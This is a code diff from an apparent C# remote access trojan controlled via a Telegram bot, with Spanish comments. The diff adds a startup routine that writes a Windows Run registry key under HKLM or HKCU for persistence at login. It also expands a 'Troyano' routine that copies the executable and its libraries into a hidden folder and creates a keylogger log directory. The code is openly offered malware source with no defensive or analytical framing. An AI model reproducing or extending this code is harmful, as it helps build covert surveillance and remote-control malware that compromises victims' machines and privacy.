@@ -82,51 +82,67 @@ namespace RAT_BotTelegram.Lib {
         }
 
         public static void StartUp() {  // Autoiniciar al iniciar sesión
-            Console.WriteLine("Startup");
+            Console.WriteLine("\n[StartUp] En proceso...\n");
+            RegistryTools R = new RegistryTools();
+            const string PathA = @"Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+            if (R.CreateKeyValue_String(PathA, config.NAME_REG, config.PATH_OCUL + @"\" + config.NAME_EXE) != "E#RR04") { 
+                Console.WriteLine("[StartUp] REG Machine - Finish");
+                Console.WriteLine(R.CreateKeyValue_String(PathA, config.NAME_REG, config.PATH_OCUL + @"\" + config.NAME_EXE));
+            } else {
+                const string Path = @"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+                R.CreateKeyValue_String(Path, config.NAME_REG, config.PATH_OCUL + @"\" + config.NAME_EXE);
+                Console.WriteLine("[StartUp] REG USER - Finish");
+            }
+
+            Console.WriteLine("\n[StartUp] Finish\n");
         }
         public static void Trojan() {   // Se replica en el sistema
-            Console.WriteLine("==>[Troyano] En proceso...");
+            Console.WriteLine("\n==>[Troyano] En proceso...\n");
+            
             // New Name *.pdb
             string exeName = config.NAME_EXE;
             exeName = exeName.Substring(0, exeName.Length - 4);
 
-            // Crea Directorio
+            // Crea Directorio RAT
             Directory.CreateDirectory(config.PATH_OCUL);
-            Console.WriteLine("==>[Directory] Se creó la ruta:\n"+config.PATH_OCUL);
-           
+            Console.WriteLine("==>[Directory RAT] Se creó la ruta: "+config.PATH_OCUL);
+
+            // Crea directorio Keylogger
+            Directory.CreateDirectory(config.PATH_LOG);
+            Console.WriteLine("==>[Directory KEY] Se creó la ruta: " + config.PATH_LOG);
+
             // Copia archivo principal
             try {
                 File.Copy(config.NAME_EXE, config.PATH_OCUL + @"\" + config.NAME_EXE);
-                Console.WriteLine("==>[File] Se copió: \n" + config.NAME_EXE);
-            } catch {Console.WriteLine("==>[File] El archivo: \n" + config.NAME_EXE+ " ya existe.");}
+                Console.WriteLine("==>[File] Se copió: " + config.NAME_EXE);
+            } catch {Console.WriteLine("==>[File] El archivo: " + config.NAME_EXE+ " ya existe.");}
             // Copia archivos secundarios.
             try {
                 File.Copy(config.NAME_EXE + ".config", config.PATH_OCUL + @"\" + config.NAME_EXE + ".config");
-                Console.WriteLine("==>[File] Se copió: \n" + config.NAME_EXE + ".config");
-            } catch {Console.WriteLine("==>[File] El archivo: \n" + config.NAME_EXE + ".config"+ " ya existe.");}
+                Console.WriteLine("==>[File] Se copió: " + config.NAME_EXE + ".config");
+            } catch {Console.WriteLine("==>[File] El archivo: " + config.NAME_EXE + ".config"+ " ya existe.");}
             try {
-                Console.WriteLine(exeName);
                 File.Copy(exeName + ".pdb", config.PATH_OCUL + @"\" + exeName + ".pdb");
-                Console.WriteLine("==>[File] Se copió: \n" + exeName + ".pdb");
-            } catch {Console.WriteLine("==>[File] El archivo: \n" + exeName + ".pdb" + " ya existe.");}
+                Console.WriteLine("==>[File] Se copió: " + exeName + ".pdb");
+            } catch {Console.WriteLine("==>[File] El archivo: " + exeName + ".pdb" + " ya existe.");}
             try {
                 File.Copy("Telegram.Bot.dll", config.PATH_OCUL + @"\" + "Telegram.Bot.dll");
-                Console.WriteLine("==>[File] Se copió: \nTelegram.Bot.dll");
-            } catch {Console.WriteLine("==>[File] El archivo: \nTelegram.Bot.dll" + " ya existe.");}
+                Console.WriteLine("==>[File] Se copió: Telegram.Bot.dll");
+            } catch {Console.WriteLine("==>[File] El archivo: Telegram.Bot.dll" + " ya existe.");}
             try {
                 File.Copy("Telegram.Bot.xml", config.PATH_OCUL + @"\" + "Telegram.Bot.xml");
-                Console.WriteLine("==>[File] Se copió: \nTelegram.Bot.xml");
-            } catch {Console.WriteLine("==>[File] El archivo: \nTelegram.Bot.xml ya existe.");}
+                Console.WriteLine("==>[File] Se copió: Telegram.Bot.xml");
+            } catch {Console.WriteLine("==>[File] El archivo: Telegram.Bot.xml ya existe.");}
             try {
                 File.Copy("Newtonsoft.Json.dll", config.PATH_OCUL + @"\" + "Newtonsoft.Json.dll");
-                Console.WriteLine("==>[File] Se copió: \nNewtonsoft.Json.dll");
-            } catch {Console.WriteLine("==>[File] El archivo: \nNewtonsoft.Json.dll ya existe.");}
+                Console.WriteLine("==>[File] Se copió: Newtonsoft.Json.dll");
+            } catch {Console.WriteLine("==>[File] El archivo: Newtonsoft.Json.dll ya existe.");}
             try {
                 File.Copy("Newtonsoft.Json.xml", config.PATH_OCUL + @"\" + "Newtonsoft.Json.xml");
-                Console.WriteLine("==>[File] Se copió: \nNewtonsoft.Json.xml");
-            } catch  {Console.WriteLine("==>[File] El archivo: \nNewtonsoft.Json.xml ya existe.");}
+                Console.WriteLine("==>[File] Se copió: Newtonsoft.Json.xml");
+            } catch  {Console.WriteLine("==>[File] El archivo: Newtonsoft.Json.xml ya existe.");}
 
-            Console.WriteLine("==>[Troyano] Finish");
+            Console.WriteLine("\n==>[Troyano] Finish\n");
 
         }
     
